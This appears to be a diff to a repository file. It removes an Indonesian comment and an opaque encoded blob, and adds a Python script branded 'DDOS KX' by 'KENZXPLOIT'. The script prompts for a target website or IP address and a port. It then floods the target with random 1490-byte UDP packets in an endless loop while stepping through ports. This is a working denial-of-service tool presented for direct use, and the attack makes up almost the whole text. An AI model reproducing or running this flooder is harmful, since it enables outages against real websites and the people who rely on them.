@@ -1,3 +1,62 @@
-#mau liat apa bang🗿🗿
-
-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
+from platform import system
+from tqdm.auto import tqdm
+import os
+import time
+import random
+import socket
+import pyfiglet
+#platform info
+uname=system()
+if uname=="Windows":
+	cmd='cls'
+else :
+	cmd='clear'
+os.system(cmd)
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+while True:
+	print("\033[36;1m")
+	print(pyfiglet.figlet_format("DDOS KX",font='alligator'),'\033[0m')
+    
+	print("   \033[36;1m           ═ ━  BY KENZXPLOIT  -  VERSI 3.2.1 ━ ═ ")
+	print()
+	print("\033[0m","\033[32;1m")
+	print("[.1.] →→→ [ Website Domain ]\n[.2.] →→→ [ IP Addresse ]\n[.3.] →→→ [ Exit ]")
+	opt=str(input("\nEnter Your choice : "))
+	if opt=='1':
+		domain=str(input("Enter The Website (https://site.com):"))
+		ip=socket.gethostbyname(domain)
+		break
+	elif opt=='2':
+		ip = input("IP Addresse : ")
+		break
+	elif opt=='3':
+		print('\033[0m')
+		exit()
+	else:
+		print('\033[91mInvaild Choice!\033[0m')
+		time.sleep(2)
+		os.system(cmd)
+port =int(input("Port Number  : "))
+os.system(cmd)
+print('\033[36;2mINITIALIZING....')
+for i in tqdm(range(10000)):
+	print(end='\r')
+time.sleep(4)
+print('STARTING...')
+time.sleep(4)
+sent = 0
+try:
+	while True:
+		sock.sendto(bytes, (ip,port))
+		sent=sent+1
+		port=port+1
+		print("\033[32;1mSent %s packet to %s throught port:%s"%(sent,ip,port))
+		if port==65534:
+			port=1
+		elif port==1900:
+			port=1901
+except:
+	print('\n\033[31;1mExited\nterima kasih, telah menggunakan script ini \033[0m')
